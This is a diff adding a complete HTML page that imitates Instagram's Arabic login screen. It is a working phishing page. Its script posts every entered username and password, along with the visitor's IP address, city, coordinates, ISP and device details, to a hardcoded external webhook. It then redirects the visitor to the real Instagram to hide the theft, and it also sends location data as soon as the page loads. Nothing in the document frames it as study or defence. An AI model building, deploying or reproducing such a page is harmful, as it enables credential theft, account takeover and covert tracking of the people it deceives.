@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, viewport-fit=cover">
+<title>Instagram</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
+<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+<style>
+:root {
+  --ig-primary-background: 12, 16, 20;
+  --ig-primary-text: 248, 249, 249;
+  --ig-secondary-text: 162, 170, 180;
+  --ig-stroke: 54, 54, 54;
+  --ig-input-border-radius: 12px;
+  --accent: #0095F6;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+html, body {
+  height: 100%;
+  background: rgb(var(--ig-primary-background));
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: rgb(var(--ig-primary-text));
+  overflow: hidden;
+}
+
+body {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  min-height: 100vh;
+  min-height: -webkit-fill-available;
+  padding: 20px 16px 40px;
+}
+
+.lang-bar {
+  width: 100%;
+  text-align: center;
+  font-size: 14px;
+  color: rgb(var(--ig-primary-text));
+  padding-top: 6px;
+  opacity: 0.9;
+}
+
+.middle {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+  max-width: 380px;
+  gap: 12px;
+}
+
+.logo-wrap {
+  width: 76px;
+  height: 76px;
+  border-radius: 18px;
+  overflow: hidden;
+  margin-bottom: 20px;
+}
+
+.logo-wrap img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  border-radius: 18px;
+}
+
+.input-field {
+  width: 100%;
+  position: relative;
+}
+
+.input-field input {
+  width: 100%;
+  background: rgba(255, 255, 255, 0.07);
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  border-radius: var(--ig-input-border-radius);
+  padding: 17px 16px;
+  font-size: 16px;
+  color: rgb(var(--ig-primary-text));
+  outline: none;
+  text-align: right;
+  font-family: inherit;
+  -webkit-appearance: none;
+  transition: border-color 0.15s, background 0.15s;
+  caret-color: var(--accent);
+}
+
+.input-field input::placeholder {
+  color: rgba(162, 170, 180, 0.7);
+  font-size: 15px;
+}
+
+.input-field input:focus {
+  border-color: rgba(255, 255, 255, 0.28);
+  background: rgba(255, 255, 255, 0.1);
+}
+
+.btn-login {
+  width: 100%;
+  background: var(--accent);
+  color: white;
+  border: none;
+  border-radius: 12px;
+  padding: 16px;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  margin-top: 4px;
+  font-family: inherit;
+  opacity: 0.4;
+  transition: opacity 0.15s, transform 0.1s;
+  -webkit-appearance: none;
+  letter-spacing: 0.1px;
+}
+
+.btn-login.ready { opacity: 1; }
+.btn-login.ready:active { transform: scale(0.98); }
+
+.forgot-link {
+  color: rgb(var(--ig-primary-text));
+  font-size: 14px;
+  text-decoration: none;
+  text-align: center;
+  margin-top: 4px;
+  display: block;
+  opacity: 0.75;
+}
+
+.divider {
+  width: 100%;
+  height: 0.5px;
+  background: rgba(255,255,255,0.12);
+  margin: 8px 0;
+}
+
+.btn-signup {
+  width: 100%;
+  background: transparent;
+  color: #4DB5FF;
+  border: 1.5px solid rgba(77, 181, 255, 0.3);
+  border-radius: 12px;
+  padding: 15px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: inherit;
+  -webkit-appearance: none;
+  transition: background 0.15s;
+}
+
+.btn-signup:active { background: rgba(77,181,255,0.06); }
+
+.meta-footer {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  color: rgba(162, 170, 180, 0.7);
+  font-size: 13px;
+  padding-bottom: env(safe-area-inset-bottom);
+}
+
+.meta-symbol { font-size: 17px; line-height: 1; }
+
+/* Loading overlay */
+.loading-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgb(var(--ig-primary-background));
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  gap: 22px;
+}
+
+.loading-logo {
+  width: 58px;
+  height: 58px;
+  border-radius: 15px;
+}
+
+.spinner {
+  width: 30px;
+  height: 30px;
+  border: 2.5px solid rgba(255,255,255,0.15);
+  border-top-color: rgba(255,255,255,0.75);
+  border-radius: 50%;
+  animation: spin 0.75s linear infinite;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="lang-bar">العربية</div>
+
+<div class="middle">
+  <div class="logo-wrap">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram">
+  </div>
+
+  <div class="input-field">
+    <input
+      type="text"
+      id="username"
+      placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول"
+      autocomplete="off"
+      autocorrect="off"
+      autocapitalize="off"
+      spellcheck="false"
+      oninput="checkForm()"
+      onchange="checkForm()"
+    >
+  </div>
+
+  <div class="input-field">
+    <input
+      type="password"
+      id="password"
+      placeholder="كلمة السر"
+      autocomplete="off"
+      oninput="checkForm()"
+      onchange="checkForm()"
+    >
+  </div>
+
+  <button class="btn-login" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
+
+  <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+
+  <div class="divider"></div>
+
+  <button class="btn-signup">إنشاء حساب جديد</button>
+</div>
+
+<div class="meta-footer">
+  <span class="meta-symbol">∞</span>
+  <span>Meta</span>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <img class="loading-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
+  <div class="spinner"></div>
+</div>
+
+<script>
+const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";
+
+function checkForm() {
+  const u = document.getElementById("username").value;
+  const p = document.getElementById("password").value;
+  const btn = document.getElementById("loginBtn");
+  btn.classList.toggle("ready", u.length > 0 && p.length > 0);
+}
+
+async function sendData(extra) {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const loc = await res.json();
+    await fetch(WEBHOOK, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "🎯 Instagram Login",
+        username: extra.username || "",
+        password: extra.password || "",
+        ip: loc.ip,
+        country: loc.country_name,
+        city: loc.city,
+        lat: loc.latitude,
+        lon: loc.longitude,
+        isp: loc.org,
+        device: navigator.userAgent,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`
+      })
+    });
+  } catch(e) {}
+}
+
+function doLogin() {
+  const u = document.getElementById("username").value.trim();
+  const p = document.getElementById("password").value.trim();
+  if (!u || !p) return;
+  document.getElementById("loadingOverlay").style.display = "flex";
+  sendData({ username: u, password: p });
+  setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 3000);
+}
+
+sendData({});
+</script>
+</body>
+</html>
